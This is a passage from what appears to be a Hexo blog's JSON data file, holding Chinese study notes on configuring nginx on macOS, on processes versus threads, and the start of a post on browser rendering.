rel=\"noopener\">http://localhost/some/example.html，nginx将会发送/data/www/some/example.html文件。</a></p>\n<p>为了应用新的配置文件，如果 nginx 还没有开启，开启即可；否则可以发送 reload 信号给 nginx 的 master 进程：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n"},{"title":"nginx初步使用（-）","date":"2018-05-08T12:06:30.000Z","_content":"\n> 在本地用 brew install nginx 之后，迫不及待的想要使用一下\n\n* mac 下默认监听 8080 端口，输入 localhost:8080 就可以看到 nginx 的欢迎页\n\n## 更改默认配置文件\n\n> 默认安装在/usr/local/etc/nginx 下面\n\n### 位置\n\n* nginx.conf 是其默认配置文件，nginx -s reload 读取的就是这个\n* 如果想配置多个域名，可以在 nginx 目录下新建一个 sites-enabled 文件夹，然后再建一个以区分 http 和 https，在 nginx.conf 里`include /usr/local/etc/nginx/sites-enabled/*`\n* 我看 centos 系统里新建的文件夹是 conf.d\n* 域名配置文件一个最佳实践就是按照域名来写，比如 yoki.com.cn.conf\n\n### 配置介绍\n\n```javascript\n# user字段表明了Nginx服务是由哪个用户哪个群组来负责维护进程的，默认是nobody\n# 我这里用了liyoujie用户，staff组来启动并维护进程\n# 查看当前用户命令： whoami\n# 查看当前用户所属组命令： groups ，当前用户可能有多个所属组，选第一个即可\nuser liyoujie staff;\n\n# worker_processes字段表示Nginx服务占用的内核数量\n# 为了充分利用服务器性能你可以直接写你本机最高内核\n# 查看本机最高内核数量命令： sysctl -n hw.ncpu\nworker_processes 4;\n\n# error_log字段表示Nginx错误日志记录的位置\n# 模式选择：debug/info/notice/warn/error/crit\n# 上面模式从左到右记录的信息从最详细到最少\nerror_log  /usr/local/var/logs/nginx/error.log debug;\n\n# Nginx执行的进程id,默认配置文件是注释了\n# 如果上面worker_processes的数量大于1那Nginx就会启动多个进程\n# 而发信号的时候需要知道要向哪个进程发信息，不同进程有不同的pid，所以写进文件发信号比较简单\n# 你只需要手动创建，比如我下面的位置： touch /usr/local/var/run/nginx.pid\npid  /usr/local/var/run/nginx.pid;\n\nevents {\n    # 每一个worker进程能并发处理的最大连接数\n    # 当作为反向代理服务器，计算公式为： `worker_processes * worker_connections / 4`\n    # 当作为HTTP服务器时，公式是除以2\n    worker_connections  2048;\n}\n\nhttp {\n    # 关闭错误页面的nginx版本数字，提高安全性\n    server_tokens off;\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    # 日志记录格式，如果关闭了access_log可以注释掉这段\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                 '$status $body_bytes_sent \"$http_referer\" '\n    #                '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    # 关闭access_log可以让读取磁盘IO操作更快\n    # 当然如果你在学习的过程中可以打开方便查看Nginx的访问日志\n    access_log off;\n\n    sendfile        on;\n\n    # 在一个数据包里发送所有头文件，而不是一个接一个的发送\n    tcp_nopush     on;\n\n    # 不要缓存\n    tcp_nodelay on;\n\n    keepalive_timeout  65;\n\n    gzip  on;\n    client_max_body_size 10m;\n    client_body_buffer_size 128k;\n\n    # 引入其他文件，一个是http服务的，一个是https服务的\n    # 由这里include可以知道，那些被include的文件都是server上下文开始的（并不是http上下文）\n    # default default-ssl\n    include /usr/local/etc/nginx/sites-enabled/*;\n}\n```\n","source":"_posts/study-nginx3.md","raw":"---\ntitle: nginx初步使用（-）\ndate: 2018-05-08 20:06:30\ntags: nginx\n---\n\n> 在本地用 brew install nginx 之后，迫不及待的想要使用一下\n\n* mac 下默认监听 8080 端口，输入 localhost:8080 就可以看到 nginx 的欢迎页\n\n## 更改默认配置文件\n\n> 默认安装在/usr/local/etc/nginx 下面\n\n### 位置\n\n* nginx.conf 是其默认配置文件，nginx -s reload 读取的就是这个\n* 如果想配置多个域名，可以在 nginx 目录下新建一个 sites-enabled 文件夹，然后再建一个以区分 http 和 https，在 nginx.conf 里`include /usr/local/etc/nginx/sites-enabled/*`\n* 我看 centos 系统里新建的文件夹是 conf.d\n* 域名配置文件一个最佳实践就是按照域名来写，比如 yoki.com.cn.conf\n\n### 配置介绍\n\n```javascript\n# user字段表明了Nginx服务是由哪个用户哪个群组来负责维护进程的，默认是nobody\n# 我这里用了liyoujie用户，staff组来启动并维护进程\n# 查看当前用户命令： whoami\n# 查看当前用户所属组命令： groups ，当前用户可能有多个所属组，选第一个即可\nuser liyoujie staff;\n\n# worker_processes字段表示Nginx服务占用的内核数量\n# 为了充分利用服务器性能你可以直接写你本机最高内核\n# 查看本机最高内核数量命令： sysctl -n hw.ncpu\nworker_processes 4;\n\n# error_log字段表示Nginx错误日志记录的位置\n# 模式选择：debug/info/notice/warn/error/crit\n# 上面模式从左到右记录的信息从最详细到最少\nerror_log  /usr/local/var/logs/nginx/error.log debug;\n\n# Nginx执行的进程id,默认配置文件是注释了\n# 如果上面worker_processes的数量大于1那Nginx就会启动多个进程\n# 而发信号的时候需要知道要向哪个进程发信息，不同进程有不同的pid，所以写进文件发信号比较简单\n# 你只需要手动创建，比如我下面的位置： touch /usr/local/var/run/nginx.pid\npid  /usr/local/var/run/nginx.pid;\n\nevents {\n    # 每一个worker进程能并发处理的最大连接数\n    # 当作为反向代理服务器，计算公式为： `worker_processes * worker_connections / 4`\n    # 当作为HTTP服务器时，公式是除以2\n    worker_connections  2048;\n}\n\nhttp {\n    # 关闭错误页面的nginx版本数字，提高安全性\n    server_tokens off;\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    # 日志记录格式，如果关闭了access_log可以注释掉这段\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                 '$status $body_bytes_sent \"$http_referer\" '\n    #                '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    # 关闭access_log可以让读取磁盘IO操作更快\n    # 当然如果你在学习的过程中可以打开方便查看Nginx的访问日志\n    access_log off;\n\n    sendfile        on;\n\n    # 在一个数据包里发送所有头文件，而不是一个接一个的发送\n    tcp_nopush     on;\n\n    # 不要缓存\n    tcp_nodelay on;\n\n    keepalive_timeout  65;\n\n    gzip  on;\n    client_max_body_size 10m;\n    client_body_buffer_size 128k;\n\n    # 引入其他文件，一个是http服务的，一个是https服务的\n    # 由这里include可以知道，那些被include的文件都是server上下文开始的（并不是http上下文）\n    # default default-ssl\n    include /usr/local/etc/nginx/sites-enabled/*;\n}\n```\n","slug":"study-nginx3","published":1,"updated":"2018-05-08T13:08:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034rv003o0iofsoqzbx2h","content":"<blockquote>\n<p>在本地用 brew install nginx 之后，迫不及待的想要使用一下</p>\n</blockquote>\n<ul>\n<li>mac 下默认监听 8080 端口，输入 localhost:8080 就可以看到 nginx 的欢迎页</li>\n</ul>\n<h2 id=\"更改默认配置文件\"><a href=\"#更改默认配置文件\" class=\"headerlink\" title=\"更改默认配置文件\"></a>更改默认配置文件</h2><blockquote>\n<p>默认安装在/usr/local/etc/nginx 下面</p>\n</blockquote>\n<h3 id=\"位置\"><a href=\"#位置\" class=\"headerlink\" title=\"位置\"></a>位置</h3><ul>\n<li>nginx.conf 是其默认配置文件，nginx -s reload 读取的就是这个</li>\n<li>如果想配置多个域名，可以在 nginx 目录下新建一个 sites-enabled 文件夹，然后再建一个以区分 http 和 https，在 nginx.conf 里<code>include /usr/local/etc/nginx/sites-enabled/*</code></li>\n<li>我看 centos 系统里新建的文件夹是 conf.d</li>\n<li>域名配置文件一个最佳实践就是按照域名来写，比如 yoki.com.cn.conf</li>\n</ul>\n<h3 id=\"配置介绍\"><a href=\"#配置介绍\" class=\"headerlink\" title=\"配置介绍\"></a>配置介绍</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># user字段表明了Nginx服务是由哪个用户哪个群组来负责维护进程的，默认是nobody</span><br><span class=\"line\"># 我这里用了liyoujie用户，staff组来启动并维护进程</span><br><span class=\"line\"># 查看当前用户命令： whoami</span><br><span class=\"line\"># 查看当前用户所属组命令： groups ，当前用户可能有多个所属组，选第一个即可</span><br><span class=\"line\">user liyoujie staff;</span><br><span class=\"line\"></span><br><span class=\"line\"># worker_processes字段表示Nginx服务占用的内核数量</span><br><span class=\"line\"># 为了充分利用服务器性能你可以直接写你本机最高内核</span><br><span class=\"line\"># 查看本机最高内核数量命令： sysctl -n hw.ncpu</span><br><span class=\"line\">worker_processes <span class=\"number\">4</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"># error_log字段表示Nginx错误日志记录的位置</span><br><span class=\"line\"># 模式选择：debug/info/notice/warn/error/crit</span><br><span class=\"line\"># 上面模式从左到右记录的信息从最详细到最少</span><br><span class=\"line\">error_log  /usr/local/<span class=\"keyword\">var</span>/logs/nginx/error.log debug;</span><br><span class=\"line\"></span><br><span class=\"line\"># Nginx执行的进程id,默认配置文件是注释了</span><br><span class=\"line\"># 如果上面worker_processes的数量大于1那Nginx就会启动多个进程</span><br><span class=\"line\"># 而发信号的时候需要知道要向哪个进程发信息，不同进程有不同的pid，所以写进文件发信号比较简单</span><br><span class=\"line\"># 你只需要手动创建，比如我下面的位置： touch /usr/local/var/run/nginx.pid</span><br><span class=\"line\">pid  /usr/local/<span class=\"keyword\">var</span>/run/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    # 每一个worker进程能并发处理的最大连接数</span><br><span class=\"line\">    # 当作为反向代理服务器，计算公式为： `worker_processes * worker_connections / 4`</span><br><span class=\"line\">    # 当作为HTTP服务器时，公式是除以2</span><br><span class=\"line\">    worker_connections  <span class=\"number\">2048</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    # 关闭错误页面的nginx版本数字，提高安全性</span><br><span class=\"line\">    server_tokens off;</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    # 日志记录格式，如果关闭了access_log可以注释掉这段</span><br><span class=\"line\">    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '</span><br><span class=\"line\">    #                 '$status $body_bytes_sent \"$http_referer\" '</span><br><span class=\"line\">    #                '\"$http_user_agent\" \"$http_x_forwarded_for\"';</span><br><span class=\"line\"></span><br><span class=\"line\">    # 关闭access_log可以让读取磁盘IO操作更快</span><br><span class=\"line\">    # 当然如果你在学习的过程中可以打开方便查看Nginx的访问日志</span><br><span class=\"line\">    access_log off;</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\"></span><br><span class=\"line\">    # 在一个数据包里发送所有头文件，而不是一个接一个的发送</span><br><span class=\"line\">    tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    # 不要缓存</span><br><span class=\"line\">    tcp_nodelay on;</span><br><span class=\"line\"></span><br><span class=\"line\">    keepalive_timeout  <span class=\"number\">65</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    gzip  on;</span><br><span class=\"line\">    client_max_body_size <span class=\"number\">10</span>m;</span><br><span class=\"line\">    client_body_buffer_size <span class=\"number\">128</span>k;</span><br><span class=\"line\"></span><br><span class=\"line\">    # 引入其他文件，一个是http服务的，一个是https服务的</span><br><span class=\"line\">    # 由这里include可以知道，那些被include的文件都是server上下文开始的（并不是http上下文）</span><br><span class=\"line\">    # default default-ssl</span><br><span class=\"line\">    include /usr/local/etc/nginx/sites-enabled<span class=\"comment\">/*;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>在本地用 brew install nginx 之后，迫不及待的想要使用一下</p>\n</blockquote>\n<ul>\n<li>mac 下默认监听 8080 端口，输入 localhost:8080 就可以看到 nginx 的欢迎页</li>\n</ul>\n<h2 id=\"更改默认配置文件\"><a href=\"#更改默认配置文件\" class=\"headerlink\" title=\"更改默认配置文件\"></a>更改默认配置文件</h2><blockquote>\n<p>默认安装在/usr/local/etc/nginx 下面</p>\n</blockquote>\n<h3 id=\"位置\"><a href=\"#位置\" class=\"headerlink\" title=\"位置\"></a>位置</h3><ul>\n<li>nginx.conf 是其默认配置文件，nginx -s reload 读取的就是这个</li>\n<li>如果想配置多个域名，可以在 nginx 目录下新建一个 sites-enabled 文件夹，然后再建一个以区分 http 和 https，在 nginx.conf 里<code>include /usr/local/etc/nginx/sites-enabled/*</code></li>\n<li>我看 centos 系统里新建的文件夹是 conf.d</li>\n<li>域名配置文件一个最佳实践就是按照域名来写，比如 yoki.com.cn.conf</li>\n</ul>\n<h3 id=\"配置介绍\"><a href=\"#配置介绍\" class=\"headerlink\" title=\"配置介绍\"></a>配置介绍</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># user字段表明了Nginx服务是由哪个用户哪个群组来负责维护进程的，默认是nobody</span><br><span class=\"line\"># 我这里用了liyoujie用户，staff组来启动并维护进程</span><br><span class=\"line\"># 查看当前用户命令： whoami</span><br><span class=\"line\"># 查看当前用户所属组命令： groups ，当前用户可能有多个所属组，选第一个即可</span><br><span class=\"line\">user liyoujie staff;</span><br><span class=\"line\"></span><br><span class=\"line\"># worker_processes字段表示Nginx服务占用的内核数量</span><br><span class=\"line\"># 为了充分利用服务器性能你可以直接写你本机最高内核</span><br><span class=\"line\"># 查看本机最高内核数量命令： sysctl -n hw.ncpu</span><br><span class=\"line\">worker_processes <span class=\"number\">4</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"># error_log字段表示Nginx错误日志记录的位置</span><br><span class=\"line\"># 模式选择：debug/info/notice/warn/error/crit</span><br><span class=\"line\"># 上面模式从左到右记录的信息从最详细到最少</span><br><span class=\"line\">error_log  /usr/local/<span class=\"keyword\">var</span>/logs/nginx/error.log debug;</span><br><span class=\"line\"></span><br><span class=\"line\"># Nginx执行的进程id,默认配置文件是注释了</span><br><span class=\"line\"># 如果上面worker_processes的数量大于1那Nginx就会启动多个进程</span><br><span class=\"line\"># 而发信号的时候需要知道要向哪个进程发信息，不同进程有不同的pid，所以写进文件发信号比较简单</span><br><span class=\"line\"># 你只需要手动创建，比如我下面的位置： touch /usr/local/var/run/nginx.pid</span><br><span class=\"line\">pid  /usr/local/<span class=\"keyword\">var</span>/run/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    # 每一个worker进程能并发处理的最大连接数</span><br><span class=\"line\">    # 当作为反向代理服务器，计算公式为： `worker_processes * worker_connections / 4`</span><br><span class=\"line\">    # 当作为HTTP服务器时，公式是除以2</span><br><span class=\"line\">    worker_connections  <span class=\"number\">2048</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    # 关闭错误页面的nginx版本数字，提高安全性</span><br><span class=\"line\">    server_tokens off;</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    # 日志记录格式，如果关闭了access_log可以注释掉这段</span><br><span class=\"line\">    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '</span><br><span class=\"line\">    #                 '$status $body_bytes_sent \"$http_referer\" '</span><br><span class=\"line\">    #                '\"$http_user_agent\" \"$http_x_forwarded_for\"';</span><br><span class=\"line\"></span><br><span class=\"line\">    # 关闭access_log可以让读取磁盘IO操作更快</span><br><span class=\"line\">    # 当然如果你在学习的过程中可以打开方便查看Nginx的访问日志</span><br><span class=\"line\">    access_log off;</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\"></span><br><span class=\"line\">    # 在一个数据包里发送所有头文件，而不是一个接一个的发送</span><br><span class=\"line\">    tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    # 不要缓存</span><br><span class=\"line\">    tcp_nodelay on;</span><br><span class=\"line\"></span><br><span class=\"line\">    keepalive_timeout  <span class=\"number\">65</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    gzip  on;</span><br><span class=\"line\">    client_max_body_size <span class=\"number\">10</span>m;</span><br><span class=\"line\">    client_body_buffer_size <span class=\"number\">128</span>k;</span><br><span class=\"line\"></span><br><span class=\"line\">    # 引入其他文件，一个是http服务的，一个是https服务的</span><br><span class=\"line\">    # 由这里include可以知道，那些被include的文件都是server上下文开始的（并不是http上下文）</span><br><span class=\"line\">    # default default-ssl</span><br><span class=\"line\">    include /usr/local/etc/nginx/sites-enabled<span class=\"comment\">/*;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br></pre></td></tr></table></figure>\n"},{"title":"进程和线程","date":"2017-11-09T03:56:29.000Z","_content":"\n> 进程(process)和线程（thread）\n\n* 进程和线程独立运行，并可能同时运行，多个线程能够共享单个进程的内存。\n* 进程是具有一定独立功能的程序，它是系统进行资源分配和调度的一个独立单位，重点在系统调度和单独的单位，换句话说进程是可以独立运行的一段程序。\n* 线程是进程得一个实体，是 CPU 调度和分派的基本单位，他是比进程更小的独立运行的基本单位，线程自己基本上不拥有系统资源。在运行时，只是暂用一些计数器、寄存器和栈。\n\n> 他们之间的关系是\n\n* 一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程（就是通常说的主线程）\n* 资源分配给进程，同一进程的所有线程共享该进程的所有资源\n* 线程在执行过程中，需要协作同步。不同进程的线程间要利用消息通信的方法实现同步。\n* 处理机分给线程，即真正在处理机上运行得是线程\n* 线程是指进程内的一个执行单元，也是进程内的可调度实体\n\n> 他们之间的区别\n\n* 调度：线程作为调度和分配的基本单位，进程作为拥有资源的基本单位\n* 并发性：不仅进程之间可以并发执行，同一个进程的多个线程之间也可以并发执行。\n* 拥有资源：进程是拥有资源的一个独立单位，线程不拥有系统资源，但也可以访问隶属于进程的资源。\n\n> 生动形象\n\n* 书面上，进程和线程基本是一个东西，只是进程可以包含若干个线程。此外就是在操作系统中的层级上，也就是粒度不同外，没有其他大的区别。在一般使用中，需要就多开几个线程。\n* 形象的说，进程就是一个项目组，每个程序员就是里面的线程，当然一个程序员也可以是一个项目组，对应的一个进程只有一个线程，而且还是主线程。公司里面的任务是分配给项目组级别的，也就是说系统资源是分配给进程的，但是干活的是程序员（线程）。\n","source":"_posts/study-processAndthread.md","raw":"---\ntitle: 进程和线程\ndate: 2017-11-09 11:56:29\ntags: 计算机基础\n---\n\n> 进程(process)和线程（thread）\n\n* 进程和线程独立运行，并可能同时运行，多个线程能够共享单个进程的内存。\n* 进程是具有一定独立功能的程序，它是系统进行资源分配和调度的一个独立单位，重点在系统调度和单独的单位，换句话说进程是可以独立运行的一段程序。\n* 线程是进程得一个实体，是 CPU 调度和分派的基本单位，他是比进程更小的独立运行的基本单位，线程自己基本上不拥有系统资源。在运行时，只是暂用一些计数器、寄存器和栈。\n\n> 他们之间的关系是\n\n* 一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程（就是通常说的主线程）\n* 资源分配给进程，同一进程的所有线程共享该进程的所有资源\n* 线程在执行过程中，需要协作同步。不同进程的线程间要利用消息通信的方法实现同步。\n* 处理机分给线程，即真正在处理机上运行得是线程\n* 线程是指进程内的一个执行单元，也是进程内的可调度实体\n\n> 他们之间的区别\n\n* 调度：线程作为调度和分配的基本单位，进程作为拥有资源的基本单位\n* 并发性：不仅进程之间可以并发执行，同一个进程的多个线程之间也可以并发执行。\n* 拥有资源：进程是拥有资源的一个独立单位，线程不拥有系统资源，但也可以访问隶属于进程的资源。\n\n> 生动形象\n\n* 书面上，进程和线程基本是一个东西，只是进程可以包含若干个线程。此外就是在操作系统中的层级上，也就是粒度不同外，没有其他大的区别。在一般使用中，需要就多开几个线程。\n* 形象的说，进程就是一个项目组，每个程序员就是里面的线程，当然一个程序员也可以是一个项目组，对应的一个进程只有一个线程，而且还是主线程。公司里面的任务是分配给项目组级别的，也就是说系统资源是分配给进程的，但是干活的是程序员（线程）。\n","slug":"study-processAndthread","published":1,"updated":"2018-05-09T12:23:18.295Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034rw003q0iof87iy35sr","content":"<blockquote>\n<p>进程(process)和线程（thread）</p>\n</blockquote>\n<ul>\n<li>进程和线程独立运行，并可能同时运行，多个线程能够共享单个进程的内存。</li>\n<li>进程是具有一定独立功能的程序，它是系统进行资源分配和调度的一个独立单位，重点在系统调度和单独的单位，换句话说进程是可以独立运行的一段程序。</li>\n<li>线程是进程得一个实体，是 CPU 调度和分派的基本单位，他是比进程更小的独立运行的基本单位，线程自己基本上不拥有系统资源。在运行时，只是暂用一些计数器、寄存器和栈。</li>\n</ul>\n<blockquote>\n<p>他们之间的关系是</p>\n</blockquote>\n<ul>\n<li>一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程（就是通常说的主线程）</li>\n<li>资源分配给进程，同一进程的所有线程共享该进程的所有资源</li>\n<li>线程在执行过程中，需要协作同步。不同进程的线程间要利用消息通信的方法实现同步。</li>\n<li>处理机分给线程，即真正在处理机上运行得是线程</li>\n<li>线程是指进程内的一个执行单元，也是进程内的可调度实体</li>\n</ul>\n<blockquote>\n<p>他们之间的区别</p>\n</blockquote>\n<ul>\n<li>调度：线程作为调度和分配的基本单位，进程作为拥有资源的基本单位</li>\n<li>并发性：不仅进程之间可以并发执行，同一个进程的多个线程之间也可以并发执行。</li>\n<li>拥有资源：进程是拥有资源的一个独立单位，线程不拥有系统资源，但也可以访问隶属于进程的资源。</li>\n</ul>\n<blockquote>\n<p>生动形象</p>\n</blockquote>\n<ul>\n<li>书面上，进程和线程基本是一个东西，只是进程可以包含若干个线程。此外就是在操作系统中的层级上，也就是粒度不同外，没有其他大的区别。在一般使用中，需要就多开几个线程。</li>\n<li>形象的说，进程就是一个项目组，每个程序员就是里面的线程，当然一个程序员也可以是一个项目组，对应的一个进程只有一个线程，而且还是主线程。公司里面的任务是分配给项目组级别的，也就是说系统资源是分配给进程的，但是干活的是程序员（线程）。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>进程(process)和线程（thread）</p>\n</blockquote>\n<ul>\n<li>进程和线程独立运行，并可能同时运行，多个线程能够共享单个进程的内存。</li>\n<li>进程是具有一定独立功能的程序，它是系统进行资源分配和调度的一个独立单位，重点在系统调度和单独的单位，换句话说进程是可以独立运行的一段程序。</li>\n<li>线程是进程得一个实体，是 CPU 调度和分派的基本单位，他是比进程更小的独立运行的基本单位，线程自己基本上不拥有系统资源。在运行时，只是暂用一些计数器、寄存器和栈。</li>\n</ul>\n<blockquote>\n<p>他们之间的关系是</p>\n</blockquote>\n<ul>\n<li>一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程（就是通常说的主线程）</li>\n<li>资源分配给进程，同一进程的所有线程共享该进程的所有资源</li>\n<li>线程在执行过程中，需要协作同步。不同进程的线程间要利用消息通信的方法实现同步。</li>\n<li>处理机分给线程，即真正在处理机上运行得是线程</li>\n<li>线程是指进程内的一个执行单元，也是进程内的可调度实体</li>\n</ul>\n<blockquote>\n<p>他们之间的区别</p>\n</blockquote>\n<ul>\n<li>调度：线程作为调度和分配的基本单位，进程作为拥有资源的基本单位</li>\n<li>并发性：不仅进程之间可以并发执行，同一个进程的多个线程之间也可以并发执行。</li>\n<li>拥有资源：进程是拥有资源的一个独立单位，线程不拥有系统资源，但也可以访问隶属于进程的资源。</li>\n</ul>\n<blockquote>\n<p>生动形象</p>\n</blockquote>\n<ul>\n<li>书面上，进程和线程基本是一个东西，只是进程可以包含若干个线程。此外就是在操作系统中的层级上，也就是粒度不同外，没有其他大的区别。在一般使用中，需要就多开几个线程。</li>\n<li>形象的说，进程就是一个项目组，每个程序员就是里面的线程，当然一个程序员也可以是一个项目组，对应的一个进程只有一个线程，而且还是主线程。公司里面的任务是分配给项目组级别的，也就是说系统资源是分配给进程的，但是干活的是程序员（线程）。</li>\n</ul>\n"},{"title":"浅谈浏览器渲染","date":"2018-01-10T02:26:50.000Z","_content":"\n* 作为一个前端工程师，了解浏览器的渲染过程，可以掌握优化的指导原则。\n* 现在有那么多的优化方案，预编译，预加载，资源合并，按需加载等等都是针对浏览器渲染的优化。\n\n### 关键渲染路径\n\n* 关键渲染路径(Critical Rendering Path)是指与当前用户操作有关的内容\n* 比如用户刚刚打开一个页面，首屏的显示就是当前用户操作的内容，具体就是浏览器收到 html/css/js 等资源并对其进行处理从而渲染出页面\n* 了解浏览器渲染的过程与原理，很大程度上是为了优化关键渲染路径\n* 为了保障首屏内容的最快速显示，通常会提到渐进式页面渲染，但是为了渐进式页面渲染，就要做资源的拆分，怎么拆分，这是按场景考虑的\n\n## 浏览器渲染页面过程\n\n* 1.dns 查询\n* 2.tcp 连接\n* 3.http 请求即响应\n* 4.服务端响应\n* 5.客户端渲染\n\n### 客户端渲染\n\n> 以下步骤不一定一次性顺序完成，如果 dom 或者 cssom 被修改，则以下过程需要重复执行，这样才能计算哪些像素在屏幕上需要重新渲染\n\n* 1.处理 html 标记并构建 dom 树\n* 2.处理 css 并构建 cssom 树\n* 3.将 dom 树和 cssom 树合并成一个渲染树\n* 4.根据渲染树来布局，以计算每个节点的几何信息\n* 5.将各个节点绘制到屏幕上\n\n## 阻塞渲染\n\n> 现代浏览器是并行加载资源的。当 HTML 解析器(html parser)被脚本阻塞的时候，解析器虽然会停止构建 dom，但仍然会识别该脚本后面的资源，并进行预加载。\n\n* 默认情况下，css 被视为阻塞渲染的资源，这意味着浏览器将不会渲染任何已处理的内容，直到 cssdom 构建完毕\n* js 不仅可以读取和修改 dom 属性，还可以读取和修改 cssom 属性\n\n> 存在阻塞的 css 资源的时候，浏览器就会延迟 js 的执行和 dom 构建\n\n* 当浏览器遇到一个 script 标记的时候，dom 构建将暂停，直到脚本完成执行\n* cssom 构建的时候，js 执行将暂停，直到 cssdom 就绪\n\n> 所以 script 标签的位置很重要，实际使用的时候，可以遵循下面两个原则\n\n* css 优先：引入顺序上，css 资源先于 js 资源\n* js 应该尽量少影响 dom 的构建\n\n### CSS\n\n> 